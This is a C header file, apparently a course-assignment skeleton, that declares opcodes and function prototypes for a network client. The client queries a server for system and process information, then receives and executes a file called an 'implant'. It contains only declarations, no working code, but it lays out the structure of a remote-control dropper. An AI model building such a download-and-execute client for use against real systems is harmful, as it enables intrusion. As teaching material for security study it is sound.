#pragma once

// TODO: Include all of your headers for your functions prototypes
#include <arpa/inet.h>
#include <stdbool.h>

// COMMAND OPCODES
#define CLIENT_OP_SUCCESS           0x001
#define CLIENT_OP_FAIL              0x0FF
#define CLIENT_OP_SYS_INFO          0x100
#define CLIENT_OP_PROC_INFO         0x200
#define CLIENT_OP_START_IMPLANT     0x300
#define CLIENT_OP_KILL              0x400

#define MAX_TRANSMIT_SIZE 1024

// TODO: Declare your function prototypes
bool is_valid_ipv4(char *ipaddr);
int create_socket(void);
int connect_socket(int serverfd, struct sockaddr *addr, socklen_t addrlen);
int perform_sys_info_request(int serverfd);
int perform_proc_info_request(int serverfd);
int perform_start_implant_request(int serverfd);
int receive_implant(int serverfd, char *filepath);
int execute_implant(char* filepath);
